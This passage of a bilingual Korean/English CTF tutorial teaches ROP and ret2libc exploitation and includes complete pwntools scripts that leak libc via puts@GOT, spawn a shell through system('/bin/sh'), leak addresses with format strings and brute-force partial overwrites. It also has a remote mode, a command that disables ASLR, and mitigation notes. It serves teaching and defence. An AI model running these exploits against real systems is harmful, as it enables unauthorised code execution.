    parser.add_argument("--binary", default="./vuln", help="바이너리 경로")
    parser.add_argument(
        "--libc",
        default="/lib/x86_64-linux-gnu/libc.so.6",
        help="libc.so 경로",
    )
    parser.add_argument(
        "--offset",
        type=int,
        required=True,
        help="버퍼에서 리턴 주소까지의 오프셋 (바이트)",
    )
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="local",
        help="로컬 또는 원격 모드",
    )
    parser.add_argument("--host", default="localhost", help="원격 호스트")
    parser.add_argument("--port", type=int, default=1337, help="원격 포트")
    parser.add_argument("--debug", action="store_true", help="디버그 출력")

    args = parser.parse_args()

    # pwntools 컨텍스트 설정
    context.binary = elf = ELF(args.binary)
    context.log_level = "debug" if args.debug else "info"

    libc = ELF(args.libc)
    rop = ROP(elf)

    log.info(f"바이너리: {args.binary}")
    log.info(f"libc: {args.libc}")
    log.info(f"오프셋: {args.offset}")

    # 연결
    p = get_target(args)

    # === Stage 1: libc 베이스 leak ===
    log.info("=== Stage 1: libc 베이스 주소 Leak ===")
    leaked_puts = leak_libc_base(p, elf, rop, args.offset)

    # libc 베이스 계산: 실제 주소 - libc 내 오프셋
    libc.address = leaked_puts - libc.symbols["puts"]
    log.success(f"libc 베이스 주소: {hex(libc.address)}")

    # 베이스 주소는 보통 0x7f로 시작하고 페이지(0x1000) 경계 정렬
    if libc.address & 0xFFF != 0:
        log.warning("libc 베이스가 페이지 경계에 정렬되지 않음 — 오프셋 또는 libc 버전 재확인")

    # === Stage 2: system("/bin/sh") ===
    log.info("=== Stage 2: system('/bin/sh') 호출 ===")
    get_shell(p, libc, rop, args.offset)


if __name__ == "__main__":
    main()
```

---

## CTF 실전 팁

### GDB로 ROP 체인 디버깅

```python
#!/usr/bin/env python3
"""pwntools + GDB로 ROP 체인 단계별 디버깅."""

from pwn import ELF, ROP, context, gdb, process


def debug_rop_chain(binary_path: str, offset: int) -> None:
    context.binary = elf = ELF(binary_path)
    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    # GDB 스크립트: 각 가젯 주소에 브레이크포인트 설정
    gdb_script = f"""
    # 가젯 주소에 브레이크포인트
    break *{hex(pop_rdi)}

    # 리턴 주소 덮인 시점에서 스택 확인
    commands 1
        echo === pop rdi 가젯 도달 ===\\n
        info registers rdi rsp rbp rip
        x/10gx $rsp
        continue
    end

    continue
    """

    # gdb.debug()는 GDB 안에서 프로세스를 실행
    p = gdb.debug(binary_path, gdbscript=gdb_script)

    payload = b"A" * offset + p64(pop_rdi) + b"B" * 8
    p.sendlineafter(b"Input: ", payload)
    p.interactive()


def main() -> None:
    debug_rop_chain("./vuln", 72)


if __name__ == "__main__":
    main()
```

### 흔한 실수 및 해결법

| 문제 | 원인 | 해결 방법 |
|------|------|----------|
| `Segfault at movaps` | 스택 16바이트 정렬 실패 | `ret` 가젯 1개 추가 |
| `puts`가 짧게 읽힘 | `\x0a` 개행 문자로 끊김 | `recvuntil(b"\n")` 또는 `recvline()` 조합 |
| 주소에 null 바이트 | `\x00` 전달 불가 | PLT leak 우회 또는 다른 함수 leak |
| ASLR bypass 실패 | 브루트포스 필요 | fork 서버 환경 활용 |
| libc 버전 불일치 | 심볼 오프셋이 다름 | `libc-database`로 버전 특정 |
| `recvline()` 블로킹 | 출력이 없거나 다른 프롬프트 | `recvuntil()` 또는 `recv(timeout=n)` |
| 가젯을 못 찾음 | 바이너리에 없음 | libc 또는 다른 라이브러리 탐색 |

### libc 버전 특정 (CTF에서 자주 필요)

```bash
# leak된 주소의 하위 12비트로 libc 버전 찾기
# https://libc.blukat.me 또는 https://libc.rip 이용

# 예: leak된 puts 주소가 0x7f1234567890일 때
# 하위 12비트 = 0x890 → 이것으로 libc 버전 검색

# 또는 multiple leak으로 특정
# puts 오프셋과 system 오프셋의 차이로 버전 파악
```

### one_gadget — 인자 없이 셸 획득

```bash
# one_gadget: libc 내에 조건 맞으면 바로 execve("/bin/sh") 실행하는 가젯
gem install one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 출력 예:
# 0x4f365 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 조건 맞으면 system() 대신 one_gadget 주소 하나만 써도 됨
```

---

<!-- detect-validate-19 -->
## ROP 공격 탐지와 방어 검증

ROP 공격은 *스택 보호 부재·알려진 주소·정적 가젯·주소 누출*을 노린다. 방어자는 **카나리·NX·PIE 가 가젯 표면을 줄이는가**와 **익스플로잇이 완화 토글에 따라 재현 가능한가**를 검증해야 한다. 검증은 **통제 환경**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 반환 주소 덮기→ROP | 스택 보호 부재 | 카나리·NX·CFI | 비정상 ret 제어 흐름 |
| ret2libc | 알려진 libc 주소 | ASLR·PIE | libc 함수로의 직접 ret |
| 가젯 체인 | 정적 가젯 | PIE·가젯 축소 | 짧은 시퀀스 ret 폭주 |
| ASLR 우회(누설) | 주소 누출 | 누출 차단·재랜덤화 | 정보 누출 직후 익스플로잇 |

### 방어 검증 (직접 확인)

```bash
# 1) 완화가 실제 적용됐는지 + 가젯 표면 측정(소유 바이너리)
checksec --file=./target 2>/dev/null; ROPgadget --binary ./target | tail -1
#   "Unique gadgets" 가 많을수록 ROP 표면 큼; NX 없으면 셸코드가 더 쉽다
# 2) ASLR 토글로 익스플로잇 재현성 검증(통제 환경 전용)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   # 재현용; 검증 후 2 로 복구
```

> ROP 방어 검증의 핵심은 *완화가 표면을 실제로 줄이는가*다 — "NX/ASLR 켰다"와 "가젯 표면이 작고 익스플로잇이 재현되지 않는다"는 다르다. 통제 환경에서 checksec·ROPgadget·ASLR 토글로 직접 측정한다([[09_Exploit_Techniques]], [[21_Windows_Exploitation]], [[03_System_Hacking]]).

---

<a name="english"></a>

# ROP (Return-Oriented Programming) Chain Construction

## Learning Objectives

After completing this document, you will be able to:

- Explain stack memory and function call flow with a diagram
- Understand why NX/DEP protections block classic shellcode injection
- Describe the core idea behind ROP using an analogy
- Find ROP gadgets using ROPgadget, ropper, and pwntools
- Carry out a ret2libc attack step by step (leak → calculate → get shell)
- Understand ASLR bypass using format string leaks
- Write a complete ROP exploit script with pwntools

---

## Background: Stack Memory Fundamentals

### What Is the Stack?

The stack is a region of computer memory that works like a **stack of plates** in a cafeteria.

When plates are stacked:
- New plates are placed on **top** (push)
- Plates are taken from **the top** (pop)
- To reach the bottom plate, you must first remove all the ones above it

This is **LIFO — Last In, First Out**: the last item pushed is the first to be popped.

```
Plate analogy                  Computer stack (memory)
                               Low Address
[ Plate 3 ] ← placed last     ┌─────────────────┐ ← rsp (stack pointer)
[ Plate 2 ]                   │  local variables │
[ Plate 1 ] ← placed first    │  saved registers │
                               │  return address  │
                               └─────────────────┘
                               High Address    ← stack grows downward
```

> Key point: Computer stacks **grow toward lower addresses.** Every push decrements rsp. This is counter-intuitive — memorise it early.

---

### Core Registers

Three registers control the stack in x86-64:

| Register | Name | Role |
|---------|------|------|
| `rsp` | Stack Pointer | Points to the current top of the stack; updated automatically on push/pop |
| `rbp` | Base Pointer | Points to the base of the current function's stack frame; used as a reference for locals |
| `rip` | Instruction Pointer | Holds the address of the next instruction to execute — controlling this is the goal of exploitation |

```
Stack frame layout during a function call
Low Address
┌──────────────────────────────┐ ← rsp (inside function)
│  local variables             │  (e.g. char buf[64])
│  ...                         │
├──────────────────────────────┤ ← rbp
│  saved rbp (caller's rbp)    │  restored when function returns
├──────────────────────────────┤
│  return address              │  ← attacker's target — overwrite this
├──────────────────────────────┤
│  function arguments          │
│  ...                         │
High Address
```

---

### What Happens on the Stack During a Function Call

Consider this C code:

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // dangerous: no length check
}

int main() {
    vulnerable("hello");
    return 0;
}
```

When `main` calls `vulnerable`:

```
Step 1: before the call instruction
   rsp → [ main's stack frame ]

Step 2: call instruction executes — return address pushed onto stack
   rsp → [ return address     ]  ← address of the next instruction in main
          [ main's stack frame ]

Step 3: vulnerable's prologue runs
   push rbp           ; save caller's rbp
   mov rbp, rsp       ; establish new base
   sub rsp, 0x50      ; allocate space for locals (buf[64] + padding)

   rsp → [ buf[64]           ]  ← user input lands here
          [ saved rbp         ]
          [ return address    ]  ← next instruction in main

Step 4: ret instruction (function exit)
   pop rip            ; pop return address into rip
   → CPU jumps to wherever rip now points (back to main)
```

---

## Buffer Overflow Review — Overwriting the Return Address

`buf` is 64 bytes. `strcpy` copies without checking length.

If we send more than 64 bytes:

```
Normal input (≤ 64 bytes):
rsp → [ "AAAA...A" (64 bytes)  ]  buf — safe
       [ saved rbp (8 bytes)    ]  preserved
       [ return address (8 bytes) ]  preserved

Overflow input (≥ 73 bytes):
rsp → [ "AAAA...A" (64 bytes)  ]  buf
       [ "AAAAAAAA" (8 bytes)   ]  saved rbp — corrupted
       [ "BBBBBBBB"             ]  return address — OVERWRITTEN
                                   ↑ we control rip!
```

Offset calculation: distance from the start of `buf` to the return address:
- buf[64] + saved rbp[8] = **72 bytes** of padding before the return address

---

## NX/DEP — "No-Execute Zone"

### The Old Days (No NX)

Before NX, buffer overflow exploits were simple:

```
1. Write shellcode into the buffer
2. Overwrite return address with the buffer's address
3. On ret, rip points to the buffer
4. CPU executes the shellcode → /bin/sh
```

### What Is NX/DEP?

**NX (No-eXecute)** / **DEP (Data Execution Prevention)**:

> Mark memory pages as either writable (W) or executable (X), but never both simultaneously (W⊕X policy).

Plain English: "You cannot execute code in data regions."

```
Memory region permissions with NX enabled:
┌─────────────────────────────────────────────┐
│  .text segment          r-x  executable     │ ← program instructions
│  .data segment          rw-  NOT executable │ ← global variables
│  stack                  rw-  NOT executable │ ← local vars, buffers
│  heap                   rw-  NOT executable │ ← malloc'd memory
└─────────────────────────────────────────────┘

Attacker injects shellcode into the stack buffer
→ CPU checks page permissions on ret
→ "This page is not executable" → SIGSEGV → attack fails
```

### Verifying NX Status

```bash
# checksec tool shows all binary protections
checksec --file=./vuln_binary

# Example output:
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled          ← NX is on
# PIE:      No PIE
```

---

## ROP (Return-Oriented Programming)

### The Core Idea — The LEGO Analogy

NX says: "You cannot execute code in data regions."

ROP's answer: "Fine. I will only use code that is **already in executable regions.**"

> "Instead of injecting new code, chain together existing code snippets that are already in memory to build the functionality I want."

Think of it like LEGO:
- LEGO bricks = gadgets: short code sequences already in the binary or libc
- Assembling bricks = ROP chain: gadgets placed in order on the stack
- The finished model = the attacker's goal (e.g., `system("/bin/sh")`)

### What Is a Gadget?

A gadget is a short instruction sequence ending in `ret`:

```asm
; Gadget 1: pop rdi; ret
; Effect: pop a value from the stack into rdi, then jump to the next gadget
58          pop rdi
c3          ret

; Gadget 2: pop rsi; pop r15; ret
; Effect: pop two values into rsi and r15
5e          pop rsi
41 5f       pop r15
c3          ret

; Gadget 3: mov rax, rdi; ret
; Effect: copy rdi into rax
48 89 f8    mov rax, rdi
c3          ret

; Gadget 4: syscall; ret
; Effect: execute a Linux syscall (number in rax, args in rdi/rsi/rdx...)
0f 05       syscall
c3          ret
```

The `ret` instruction pops the top of the stack into `rip` and jumps there. This is the **chain mechanism**: every gadget's `ret` moves to the next gadget.

### Why ROP Defeats NX/DEP

```
NX/DEP protects: prevents executing code in data (stack/heap) regions.

ROP's trick:
- The stack only contains addresses (numbers), not code
- The actual code runs in .text or libc.so (both executable)
- The stack values merely point to that code

From the CPU's perspective:
→ Code executes from .text / libc (executable regions) ✓
→ No NX/DEP violation!
```

### ROP Chain Layout on the Stack

```
Stack after buffer overflow:
Low Address
┌──────────────────────────┐ ← rsp
│  "A" * offset (padding)  │  fills buf + overwrites saved rbp
├──────────────────────────┤
│  gadget1_addr            │  overwrites return address → ROP starts here
├──────────────────────────┤
│  value_for_gadget1       │  gadget1's pop instruction reads this
├──────────────────────────┤
│  gadget2_addr            │  gadget1's ret jumps here
├──────────────────────────┤
│  value_for_gadget2       │  gadget2 reads this
├──────────────────────────┤
│  ...                     │
├──────────────────────────┤
│  system() address        │  final call: system()
├──────────────────────────┤
│  "/bin/sh" address       │  argument for system() (goes into rdi)
└──────────────────────────┘
High Address

Execution flow:
1. vulnerable() ret → jumps to gadget1_addr
2. gadget1 executes: pop rdi (reads value from stack into rdi)
3. gadget1's ret → jumps to gadget2_addr
4. gadget2 executes: ...
5. Eventually: system() runs with rdi = "/bin/sh" → shell!
```

---

## x86-64 Calling Convention

To call a function via ROP, arguments must be placed in the correct registers.

**x86-64 System V AMD64 ABI (Linux)**:

| Argument | Register |
|----------|---------|
| 1st | `rdi` |
| 2nd | `rsi` |
| 3rd | `rdx` |
| 4th | `rcx` |
| 5th | `r8` |
| 6th | `r9` |
| Return value | `rax` |

To call `system("/bin/sh")`:
- `rdi` = address of the string `/bin/sh`
- `rsp` must be 16-byte aligned before the call (MOVAPS requirement)

---

## Finding Gadgets

### ROPgadget

```bash
# Install
pip install ropgadget

# List all gadgets in a binary
ROPgadget --binary ./vuln_binary --rop

# Search for specific gadgets
ROPgadget --binary ./vuln_binary --rop | grep "pop rdi"
ROPgadget --binary ./vuln_binary --rop | grep "pop rsi"
ROPgadget --binary ./vuln_binary --rop | grep ": ret$"

# Search gadgets in libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi ; ret"

# Find /bin/sh string address
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh"

# Attempt automatic chain generation
ROPgadget --binary ./vuln_binary --rop --chain "execve"
```

### ropper

```bash
# Install
pip install ropper

# Search for a gadget
ropper --file ./vuln_binary --search "pop rdi"

# Exclude bad bytes (null, newline — can corrupt payloads)
ropper --file ./vuln_binary --search "pop rdi" --badbytes "00 0a 0d"

# Search multiple files simultaneously
ropper --file ./vuln_binary --file /lib/x86_64-linux-gnu/libc.so.6
```

### pwntools ROP Module

```python
#!/usr/bin/env python3
"""Using pwntools to find ROP gadgets automatically."""

from pwn import ELF, ROP


def find_gadgets(binary_path: str) -> None:
    elf = ELF(binary_path)
    rop = ROP(elf)

    # find_gadget accepts a list of mnemonics to match consecutively
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])
    ret_only = rop.find_gadget(["ret"])

    if pop_rdi:
        print(f"pop rdi; ret          = {hex(pop_rdi[0])}")
    if pop_rsi_r15:
        print(f"pop rsi; pop r15; ret = {hex(pop_rsi_r15[0])}")
    if pop_rdx:
        print(f"pop rdx; ret          = {hex(pop_rdx[0])}")
    if ret_only:
        print(f"ret                   = {hex(ret_only[0])}")

    # dump() prints all discovered gadgets
    print("\n=== All ROP gadgets ===")
    print(rop.dump())


if __name__ == "__main__":
    find_gadgets("./vuln_binary")
```

---

## ret2libc Attack — Step by Step

### What Is libc?

**libc (GNU C Library)** is the C standard library. Nearly every Linux program uses it.

libc contains:
- `system()` — runs a shell command
- `/bin/sh` — the string we pass to `system()`

Since libc is mapped as executable, we can **call libc functions via ROP**.

```
Goal: execute system("/bin/sh")

Required:
  1. Actual memory address of system()
  2. Actual memory address of "/bin/sh"
  3. Address of a "pop rdi; ret" gadget (to put "/bin/sh" in rdi)
```

### The ASLR Problem

ASLR (Address Space Layout Randomization) randomises the libc load address on every run.

```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# Temporarily disable for testing (requires root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Even with ASLR, **offsets within libc are fixed**. Once we know the base:

```
system() real address  = libc_base + system_offset
"/bin/sh" real address = libc_base + binsh_offset
```

### Step 1: Find the Buffer Overflow Offset

```python
#!/usr/bin/env python3
"""
Automatically calculate BOF offset using a cyclic pattern.

Usage:
  python3 find_offset.py --binary ./vuln
"""

import argparse
import subprocess

from pwn import ELF, Coredump, context, cyclic, cyclic_find, process


def find_offset(binary_path: str) -> int:
    """Send cyclic pattern and extract offset from core dump."""
    context.binary = ELF(binary_path)
    context.log_level = "warning"

    p = process(binary_path)

    # cyclic(200, n=8) generates a 200-byte De Bruijn sequence
    # every 8-byte subsequence is unique → pinpoints the exact offset
    pattern = cyclic(200, n=8)
    p.sendline(pattern)
    p.wait()

    try:
        core = Coredump("./core")
        # read 8 bytes at rsp at the time of the crash
        offset = cyclic_find(core.read(core.rsp, 8), n=8)
        print(f"[+] Offset found: {offset} bytes")
        return offset
    except FileNotFoundError:
        print("[-] No core dump. Check /proc/sys/kernel/core_pattern")
        return -1


def main() -> None:
    parser = argparse.ArgumentParser(description="BOF offset finder")
    parser.add_argument("--binary", required=True, help="Path to binary")
    args = parser.parse_args()

    offset = find_offset(args.binary)
    if offset >= 0:
        print(f"[*] Use this offset: {offset}")
    else:
        print("[!] Offset calculation failed — verify manually with GDB")


if __name__ == "__main__":
    main()
```

### Step 2: Leak the libc Base Address via GOT/PLT

```
GOT (Global Offset Table): stores the resolved runtime address of each imported function.
PLT (Procedure Linkage Table): stubs that trigger lazy linking and look up GOT entries.

Key insight:
- puts@GOT holds the actual libc address of puts() after first call
- We call puts(puts@GOT) via ROP → puts prints its own address to stdout
- leaked_puts_address - puts_libc_offset = libc_base
```

```python
#!/usr/bin/env python3
"""
Stage 1: Leak libc base via puts(puts@GOT).

Payload layout:
  [padding] → [pop rdi; ret] → [puts@GOT addr] → [puts@PLT] → [main addr]
"""

import argparse
import sys

from pwn import ELF, ROP, context, flat, log, process, u64


def leak_puts_address(
    p,       # process | remote
    elf: ELF,
    rop: ROP,
    offset: int,
) -> int:
    """Call puts(puts@GOT) and read the leaked address."""
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    # Payload breakdown:
    # 1. "A" * offset:         fill buffer + overwrite saved rbp
    # 2. pop_rdi:              gadget — pops next stack value into rdi
    # 3. elf.got["puts"]:      value to pop into rdi (address where puts' real addr is stored)
    # 4. elf.plt["puts"]:      call puts() — it will print whatever rdi points to
    # 5. elf.symbols["main"]:  return here after leak so we can send stage 2
    payload = flat(
        b"A" * offset,
        pop_rdi,
        elf.got["puts"],
        elf.plt["puts"],
        elf.symbols["main"],
    )

    p.sendlineafter(b"Input: ", payload)

    # puts() writes the 6-byte address (x64 addresses, upper 2 bytes are 0x00)
    leaked_raw = p.recvline().strip()
    if not leaked_raw:
        log.error("Leak failed — check payload or binary")
        sys.exit(1)

    leaked_addr = u64(leaked_raw.ljust(8, b"\x00"))
    log.success(f"puts() real address: {hex(leaked_addr)}")
    return leaked_addr


def main() -> None:
    parser = argparse.ArgumentParser(description="libc base address leak")
    parser.add_argument("--binary", default="./vuln")
    parser.add_argument("--libc", default="/lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--offset", type=int, required=True)
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    libc = ELF(args.libc)
    rop = ROP(elf)

    p = process(args.binary)
    leaked_puts = leak_puts_address(p, elf, rop, args.offset)

    libc.address = leaked_puts - libc.symbols["puts"]
    log.success(f"libc base address: {hex(libc.address)}")
    log.success(f"system() address:  {hex(libc.symbols['system'])}")
    p.close()


if __name__ == "__main__":
    main()
```

### Step 3: Call system("/bin/sh") to Get a Shell

```python
#!/usr/bin/env python3
"""
Stage 2: Use the leaked libc base to call system("/bin/sh").

Payload layout:
  [padding] → [ret (alignment)] → [pop rdi; ret] → [/bin/sh addr] → [system addr]
"""

import argparse

from pwn import ELF, ROP, context, flat, log, process


def get_shell(
    p,       # process | remote
    libc: ELF,
    rop: ROP,
    offset: int,
) -> None:
    """Call system('/bin/sh') using known libc base address."""
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    # One extra "ret" gadget aligns the stack to 16 bytes.
    # system() contains SSE instructions (MOVAPS) that require 16-byte alignment.
    # Adding a bare "ret" shifts rsp by 8, correcting alignment.
    ret_gadget = rop.find_gadget(["ret"])[0]

    binsh_addr = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.symbols["system"]

    log.info(f"/bin/sh address: {hex(binsh_addr)}")
    log.info(f"system() address: {hex(system_addr)}")

    payload = flat(
        b"A" * offset,    # padding
        ret_gadget,       # stack alignment (16-byte boundary)
        pop_rdi,          # pop rdi; ret
        binsh_addr,       # rdi = address of "/bin/sh"
        system_addr,      # call system("/bin/sh")
    )

    p.sendlineafter(b"Input: ", payload)
    log.success("Shell obtained! Entering interactive mode...")
    p.interactive()


def main() -> None:
    parser = argparse.ArgumentParser(description="ret2libc shell")
    parser.add_argument("--binary", default="./vuln")
    parser.add_argument("--libc", default="/lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument(
        "--libc-base",
        type=lambda x: int(x, 16),
        required=True,
        help="Leaked libc base address (hex)",
    )
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    libc = ELF(args.libc)
    libc.address = args.libc_base
    rop = ROP(elf)

    p = process(args.binary)
    get_shell(p, libc, rop, args.offset)


if __name__ == "__main__":
    main()
```

---

## ASLR Bypass Techniques

### Technique 1: Format String Leak

```python
#!/usr/bin/env python3
"""
Leak stack and libc addresses via format string vulnerability.

Vulnerable pattern:
  printf(user_input);           // wrong — should be printf("%s", user_input)

Usage:
  python3 fmt_leak.py --binary ./fmt_vuln
"""

import argparse

from pwn import ELF, context, process


def leak_addresses_via_fmt(
    p,                    # process | remote
    num_entries: int = 30,
) -> list[int]:
    """Use %p format specifiers to read stack contents."""
    # %N$p prints the Nth variadic argument as a pointer (hex)
    # printf reads arguments from the stack → we can scan memory
    fmt_str = b" ".join(f"%{i}$p".encode() for i in range(1, num_entries + 1))

    p.sendlineafter(b"Input: ", fmt_str)
    output = p.recvline().decode(errors="replace").strip()

    addresses: list[int] = []
    for token in output.split():
        try:
            addresses.append(int(token, 16))
        except ValueError:
            addresses.append(0)

    return addresses


def analyse_leaks(addresses: list[int]) -> None:
    """Print leaked addresses and flag likely libc/stack pointers."""
    print("\n=== Leaked Stack Contents ===")
    for i, addr in enumerate(addresses):
        if addr == 0:
            continue
        tag = ""
        if (addr >> 40) == 0x7F:
            tag = "  ← libc candidate (starts with 0x7f)"
        elif (addr >> 48) == 0x7FFE:
            tag = "  ← stack candidate"
        print(f"  [{i+1:2d}] {hex(addr)}{tag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Format string address leak")
    parser.add_argument("--binary", required=True)
    parser.add_argument("--entries", type=int, default=30, help="Stack entries to leak")
    args = parser.parse_args()

    context.binary = ELF(args.binary)

    p = process(args.binary)
    addresses = leak_addresses_via_fmt(p, args.entries)
    analyse_leaks(addresses)
    p.close()


if __name__ == "__main__":
    main()
```

### Technique 2: Partial Overwrite

```python
#!/usr/bin/env python3
"""
ASLR partial bypass: the low 12 bits of an address never change.
Overwrite only the low 1-2 bytes to redirect execution within the same page.
Success probability: 1/16 per attempt (one unknown nibble).
"""

import argparse
import time

from pwn import ELF, context, p16, process


def partial_overwrite_bruteforce(
    binary_path: str,
    offset: int,
    target_low_bytes: int,
    max_attempts: int = 64,
) -> bool:
    """
    Brute-force the random ASLR nibble by overwriting only the low 2 bytes.
    Works best against forking servers (address stays constant per connection).
    """
    context.log_level = "error"

    for attempt in range(1, max_attempts + 1):
        p = process(binary_path)
        payload = b"A" * offset + p16(target_low_bytes)

        try:
            p.sendlineafter(b"Input: ", payload)
            p.sendline(b"id")
            result = p.recv(timeout=0.5)
            if b"uid=" in result:
                print(f"[+] Success on attempt {attempt}")
                p.interactive()
                return True
        except Exception:
            pass
        finally:
            p.close()

        time.sleep(0.05)

    print(f"[-] Failed after {max_attempts} attempts")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(description="Partial overwrite ASLR bypass")
    parser.add_argument("--binary", required=True)
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument(
        "--target",
        type=lambda x: int(x, 16),
        required=True,
        help="Low 2 bytes to overwrite (e.g. 0x17d0)",
    )
    parser.add_argument("--attempts", type=int, default=64)
    args = parser.parse_args()

    partial_overwrite_bruteforce(
        args.binary, args.offset, args.target, args.attempts
    )


if __name__ == "__main__":
    main()
```

---

## Complete pwntools ROP Exploit

A single self-contained script combining all stages:

```python
#!/usr/bin/env python3
"""
ROP Chain Exploit — fully automated ret2libc.

Attack flow:
  Stage 1: overflow → puts(puts@GOT) → leak libc base → return to main
  Stage 2: overflow → ret (align) → pop rdi → /bin/sh → system() → shell

Usage:
  python3 rop_exploit.py --binary ./vuln --offset 72
  python3 rop_exploit.py --binary ./vuln --offset 72 --mode remote --host ctf.example.com --port 9001
  python3 rop_exploit.py --binary ./vuln --offset 72 --debug
"""

import argparse
import sys

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    log,
    process,
    remote,
    u64,
)


def get_target(args: argparse.Namespace) -> "process | remote":
    if args.mode == "remote":
        log.info(f"Connecting to {args.host}:{args.port}")
        return remote(args.host, args.port)
    log.info(f"Launching local process: {args.binary}")
    return process(args.binary)


def leak_libc_base(
    p: "process | remote",
    elf: ELF,
    rop: ROP,
    offset: int,
) -> int:
    """
    Stage 1: leak puts() real address via puts(puts@GOT).

    Stack layout built:
      [A * offset] [pop rdi] [puts@GOT] [puts@PLT] [main]
    """
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    log.debug(f"pop rdi; ret gadget: {hex(pop_rdi)}")

    payload = flat(
        b"A" * offset,          # padding: fills buf + overwrites saved rbp
        pop_rdi,                # gadget: pop rdi; ret
        elf.got["puts"],        # value popped into rdi (ptr to puts' real addr)
        elf.plt["puts"],        # calls puts() — prints rdi's content as bytes
        elf.symbols["main"],    # return here to send stage 2 payload
    )

    p.sendlineafter(b"Input: ", payload)

    leaked_raw = p.recvline().strip()
    if not leaked_raw:
        log.error("Leak failed — check payload and binary")
        sys.exit(1)

    # x64 pointers are 6 significant bytes (0x0000XXXXXXXXXXXX)
    # puts stops at null bytes, so only 6 bytes are printed
    leaked_puts = u64(leaked_raw.ljust(8, b"\x00"))
    log.success(f"puts() real address: {hex(leaked_puts)}")
    return leaked_puts


def get_shell(
    p: "process | remote",
    libc: ELF,
    rop: ROP,
    offset: int,
) -> None:
    """
    Stage 2: call system('/bin/sh') using resolved libc addresses.

    Stack layout built:
      [A * offset] [ret] [pop rdi] [/bin/sh addr] [system addr]
    """
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    # system() uses MOVAPS internally — requires 16-byte stack alignment.
    # A bare "ret" gadget advances rsp by 8 bytes, fixing alignment.
    ret_gadget = rop.find_gadget(["ret"])[0]

    binsh_addr = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.symbols["system"]

    log.info(f"/bin/sh: {hex(binsh_addr)}")
    log.info(f"system(): {hex(system_addr)}")

    payload = flat(
        b"A" * offset,    # padding
        ret_gadget,       # align stack to 16 bytes
        pop_rdi,          # pop rdi; ret
        binsh_addr,       # rdi = "/bin/sh"
        system_addr,      # call system("/bin/sh")
    )

    p.sendlineafter(b"Input: ", payload)
    log.success("Shell obtained — entering interactive mode")
    p.interactive()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ROP chain exploit — ret2libc automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 rop_exploit.py --binary ./vuln --offset 72
  python3 rop_exploit.py --binary ./vuln --offset 72 --mode remote --host ctf.example.com --port 9001
""",
    )
    parser.add_argument("--binary", default="./vuln", help="Path to binary")
    parser.add_argument(
        "--libc",
        default="/lib/x86_64-linux-gnu/libc.so.6",
        help="Path to libc.so",
    )
    parser.add_argument(
        "--offset",
        type=int,
        required=True,
        help="Bytes from buffer start to return address",
    )
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="local",
    )
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--debug", action="store_true", help="Enable debug output")

    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    context.log_level = "debug" if args.debug else "info"

    libc = ELF(args.libc)
    rop = ROP(elf)

    p = get_target(args)

    # Stage 1: leak libc base
    log.info("=== Stage 1: Leaking libc base address ===")
    leaked_puts = leak_libc_base(p, elf, rop, args.offset)

    libc.address = leaked_puts - libc.symbols["puts"]
    log.success(f"libc base: {hex(libc.address)}")

    # sanity check: libc base should be page-aligned
    if libc.address & 0xFFF != 0:
        log.warning("libc base is not page-aligned — verify offset and libc version")

    # Stage 2: get shell
    log.info("=== Stage 2: Calling system('/bin/sh') ===")
    get_shell(p, libc, rop, args.offset)


if __name__ == "__main__":
    main()
```

---

## Detection and Mitigation

### Protections and Their Limits

| Protection | What It Does | Bypassed By |
|-----------|-------------|------------|
| NX/DEP | Blocks executing code in data regions | ROP (uses existing executable code) |
| ASLR | Randomises load addresses each run | Information leaks (format string, heap pointer) |
| Stack Canary | Detects stack overflow before ret | Format string read, overwrite with known value |
| PIE | Randomises the binary's own load address | Requires binary base leak |
| Full RELRO | Makes GOT read-only | Prevents GOT overwrite but not GOT read |
| CFI (Control Flow Integrity) | Validates jump/call targets at runtime | Limits gadget reuse significantly |

### Secure Coding Practices

```c
// Vulnerable — no bounds checking
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);       // BAD: no length limit
    gets(buf);                // BAD: banned function
    scanf("%s", buf);         // BAD: no width specifier
}

// Secure — explicit size limits
void secure(char *input) {
    char buf[64];
    strncpy(buf, input, sizeof(buf) - 1);  // GOOD: explicit limit
    buf[sizeof(buf) - 1] = '\0';           // GOOD: guarantee null terminator
